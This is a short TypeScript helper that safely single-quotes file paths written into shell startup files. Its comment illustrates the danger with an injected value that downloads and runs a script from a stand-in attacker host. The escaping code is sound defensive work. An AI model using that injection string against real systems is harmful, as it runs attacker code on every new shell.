/**
 * Quote a path as a POSIX shell single-quoted literal.
 *
 * Completion directories are derived from XDG_DATA_HOME / HOME, which are never
 * escaped. Interpolated into a double-quoted rc line, a value like
 * `/tmp/x$(curl attacker.sh|sh)` would run on every new shell; single quotes
 * suppress every expansion, and the `'\''` dance closes, escapes, and reopens
 * the quote around any literal apostrophe.
 */
export function shellSingleQuote(value: string): string {
  return `'${value.replace(/'/g, `'\\''`)}'`;
}
